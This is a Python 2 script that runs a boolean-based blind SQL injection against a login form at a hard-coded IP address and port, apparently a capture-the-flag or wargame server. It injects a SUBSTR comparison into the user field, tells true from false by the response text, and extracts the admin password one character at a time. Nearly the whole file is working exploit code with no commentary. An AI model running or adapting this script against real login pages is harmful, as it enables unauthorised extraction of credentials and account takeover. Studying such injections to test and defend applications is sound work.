#!/usr/bin/env python

import urllib2
import urllib
import string
import time

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"

headers = {
	'User-Agent': user_agent
}
url = "http://125.131.189.33:10201/"
password = ""

candidate = list(string.printable)[:-5]
def make_query(pos, ch):
	return """admin' AND (SUBSTR(`password`, """ + str(pos) + """, 1)) = '""" + str(ch) + """'-- """

def query(pos, ch):
	sql = make_query(pos, ch)
	post_data = urllib.urlencode({
		"user": sql,
		"password": ""
	})
	print sql


	req = urllib2.Request(url, post_data, headers)
	fp = urllib2.urlopen(req)
	s = fp.read()
	fp.close()
	if "Nope!!" in s:
		return "true"
	elif "Nope!" in s:
		return "false"
	else:
		return "error"


for index in range(1, 33):
	for character in candidate:
		print "Querying... " + str(index) + ", " + character
		ret = query(index, character)
		time.sleep(0.5)
		if ret == "true":
			password += character
			print "Found!"
			print str(index) + ":" + character
			break
		elif ret == "false":
			print "Not"
		elif ret == "error":
			print "What the hell?!"
			print "(" + str(index) + ", " + character + ")"

print "RESULT:"
print password